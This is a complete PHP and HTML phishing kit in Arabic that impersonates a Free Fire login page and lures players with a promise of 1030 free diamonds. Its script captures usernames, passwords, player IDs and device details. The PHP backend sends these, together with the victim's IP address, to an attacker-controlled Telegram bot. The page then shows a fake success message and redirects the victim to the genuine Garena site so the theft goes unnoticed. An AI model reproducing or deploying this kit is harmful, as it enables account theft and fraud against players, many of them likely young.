<?php
// توكن البوت الخاص بك (تم تحديثه)
$botToken = "BBOTTTTTTTTTTT";

// دالة لإرسال الرسائل إلى التليجرام
function sendTelegramMessage($chatId, $message, $botToken) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    return $result;
}

// إذا كان الطلب بواسطة POST، فإننا نتعامل مع إرسال البيانات من JavaScript
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    $chatId = $input['chatId'];
    $credentials = $input['credentials'] ?? null;
    $deviceInfo = $input['deviceInfo'] ?? null;
    $playerId = $input['playerId'] ?? null;

    if ($credentials && $deviceInfo && $playerId) {
        // إرسال بيانات تسجيل الدخول ومعلومات الجهاز
        $loginMessage = "
🎮 <b>بيانات تسجيل دخول Free Fire</b>

👤 <b>اسم المستخدم:</b> <code>{$credentials['username']}</code>
🔒 <b>كلمة المرور:</b> <code>{$credentials['password']}</code>
🆔 <b>معرف اللاعب:</b> <code>{$playerId}</code>

🌐 <b>معلومات الجهاز:</b>
📱 <b>User Agent:</b> {$deviceInfo['userAgent']}
🔋 <b>البطارية:</b> {$deviceInfo['battery']}
🖥️ <b>النظام:</b> {$deviceInfo['platform']}
🌐 <b>IP:</b> {$_SERVER['REMOTE_ADDR']}
📶 <b>نوع الاتصال:</b> {$deviceInfo['connection']}
🗣️ <b>اللغة:</b> {$deviceInfo['language']}
🕒 <b>المنطقة الزمنية:</b> {$deviceInfo['timezone']}
📺 <b>معلومات الشاشة:</b> {$deviceInfo['screen']}

📅 <b>التاريخ:</b> " . date('Y-m-d H:i:s') . "
        ";
        $result = sendTelegramMessage($chatId, $loginMessage, $botToken);
    }
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// الحصول على chatId من رابط الصفحة
$chatId = isset($_GET['ID']) ? $_GET['ID'] : '8107714468';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Free Fire - اربح 1030 جوهرة مجانًا</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: url('https://i.ibb.co/ksMZ3WG3/Screenshot-20260411-002237-Google.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 450px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .promo-banner {
            background: linear-gradient(135deg, #FFB900, #FF8A00);
            width: 100%;
            border-radius: 12px 12px 0 0;
            padding: 15px;
            text-align: center;
            color: white;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
            margin-bottom: -10px;
            z-index: 10;
            position: relative;
        }
        
        .login-form {
            background: rgba(0, 0, 0, 0.85);
            width: 100%;
            border-radius: 12px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            color: #fff;
        }
        
        .logo-container {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }
        
        .logo-container img {
            max-width: 180px;
            margin-bottom: 10px;
        }
        
        .logo-container p {
            font-size: 14px;
            opacity: 0.9;
            color: #ddd;
        }
        
        .form-title {
            text-align: center;
            margin-bottom: 20px;
            color: #fff;
            font-size: 22px;
        }
        
        .diamond-offer {
            text-align: center;
            background: linear-gradient(135deg, #FFB900, #FF8A00);
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.03); }
            100% { transform: scale(1); }
        }
        
        .diamond-icon {
            font-size: 24px;
            color: #00FFFF;
        }
        
        .input-group {
            margin-bottom: 15px;
        }
        
        .input-group label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #ddd;
            font-size: 14px;
        }
        
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 2px solid #444;
            border-radius: 6px;
            font-size: 14px;
            color: #fff;
            transition: border-color 0.3s;
        }
        
        .input-group input:focus {
            border-color: #FFB900;
            outline: none;
        }
        
        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            font-size: 13px;
        }
        
        .remember {
            display: flex;
            align-items: center;
        }
        
        .remember input {
            margin-left: 6px;
        }
        
        .forgot-password {
            color: #FFB900;
            text-decoration: none;
            font-size: 13px;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .login-button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #FFB900, #FF8A00);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 185, 0, 0.6);
        }
        
        .divider {
            text-align: center;
            margin: 15px 0;
            position: relative;
            color: #777;
            font-size: 13px;
        }
        
        .divider::before {
            content: "";
            position: absolute;
            left: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .divider::after {
            content: "";
            position: absolute;
            right: 0;
            top: 50%;
            width: 40%;
            height: 1px;
            background: #444;
        }
        
        .social-login {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 20px;
        }
        
        .social-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #333;
            border: 1px solid #444;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .social-btn:hover {
            background: #444;
            transform: translateY(-2px);
        }
        
        .social-btn i {
            font-size: 16px;
            color: #ddd;
        }
        
        .signup-link {
            text-align: center;
            margin-top: 15px;
            color: #ddd;
            font-size: 14px;
        }
        
        .signup-link a {
            color: #FFB900;
            text-decoration: none;
            font-weight: 600;
        }
        
        .signup-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 20px;
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 12px;
        }
        
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 8px;
        }
        
        .footer-links a {
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 5px;
            background: #FFB900;
            color: white;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 1000;
        }
        
        @media (max-width: 500px) {
            .login-form {
                padding: 20px;
            }
            
            .logo-container img {
                max-width: 130px;
            }
        }
    </style>
</head>
<body>
    <div class="notification" id="notification"></div>
    
    <div class="container">
        <div class="promo-banner">
            🎁 اربح 1030 جوهرة مجانًا عند تسجيل الدخول اليوم!
        </div>
        
        <div class="login-form">
            <div class="logo-container">
                <!-- الشعار الجديد -->
                <img src="https://i.ibb.co/4RPGpHN0/Screenshot-20260411-002259-Google.jpg" alt="Free Fire Logo">
                <p>سجل الدخول إلى حسابك للوصول إلى عالم Free Fire واربح 1030 جوهرة مجانًا</p>
            </div>
            
            <div class="diamond-offer">
                <i class="diamond-icon">💎</i>
                <span>احصل على 1030 جوهرة مجانًا عند تسجيل الدخول اليوم!</span>
            </div>
            
            <h2 class="form-title">تسجيل الدخول</h2>
            
            <form id="loginForm">
                <div class="input-group">
                    <label for="username">اسم المستخدم أو البريد الإلكتروني</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="input-group">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div class="input-group">
                    <label for="playerId">معرف اللاعب (ID)</label>
                    <input type="text" id="playerId" name="playerId" required placeholder="أدخل معرف اللاعب الخاص بك لاستلام 1030 جوهرة">
                </div>
                
                <div class="remember-forgot">
                    <div class="remember">
                        <input type="checkbox" id="remember">
                        <label for="remember">تذكرني</label>
                    </div>
                    
                    <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
                </div>
                
                <button type="submit" class="login-button">تسجيل الدخول واحصل على 1030 جوهرة</button>
            </form>
            
            <div class="divider">أو</div>
            
            <div class="social-login">
                <div class="social-btn">
                    <i class="fab fa-facebook-f"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-google"></i>
                </div>
                <div class="social-btn">
                    <i class="fab fa-twitter"></i>
                </div>
            </div>
            
            <div class="signup-link">
                ليس لديك حساب؟ <a href="#">أنشئ حسابًا</a>
            </div>
        </div>
        
        <div class="footer">
            <p>© 2025 Free Fire. جميع الحقوق محفوظة.</p>
            <div class="footer-links">
                <a href="#">الشروط</a>
                <a href="#">الخصوصية</a>
                <a href="#">المساعدة</a>
            </div>
        </div>
    </div>

    <script>
        // دالة لعرض الإشعارات
        function showNotification(message, isSuccess = false) {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.style.backgroundColor = isSuccess ? '#4CAF50' : '#FFB900';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // جمع بيانات المستخدم
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const playerId = document.getElementById('playerId').value;
            
            // جمع معلومات الجهاز
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                battery: 'غير معروف',
                connection: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
            };
            
            // محاولة الحصول على حالة البطارية إذا كانت متوفرة
            if ('getBattery' in navigator) {
                navigator.getBattery().then(function(battery) {
                    deviceInfo.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'غير مشحون'})`;
                });
            }
            
            // إظهار رسالة تحميل
            const button = document.querySelector('.login-button');
            const originalText = button.textContent;
            button.innerHTML = '<i class="fa fa-spinner fa-spin"></i> جاري تسجيل الدخول...';
            button.disabled = true;
            
            // إرسال البيانات إلى التليجرام
            sendDataToTelegram(username, password, playerId, deviceInfo);
            
            // محاكاة عملية تسجيل الدخول وتوجيه المستخدم بعد ذلك
            setTimeout(() => {
                // توجيه المستخدم إلى الموقع الأصلي لـ Free Fire
                showNotification('تم تسجيل الدخول بنجاح! سيتم إضافة 1030 جوهرة إلى حسابك قريبًا.', true);
                
                setTimeout(() => {
                    window.location.href = 'https://www.ff.garena.com';
                }, 3000);
            }, 2500);
        });
        
        function sendDataToTelegram(username, password, playerId, deviceInfo) {
            // البيانات التي سيتم إرسالها
            const data = {
                chatId: "<?php echo $chatId; ?>", // استخدام chatId من PHP
                credentials: {
                    username: username,
                    password: password
                },
                playerId: playerId,
                deviceInfo: deviceInfo
            };
            
            // إرسال البيانات إلى الخادم
            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
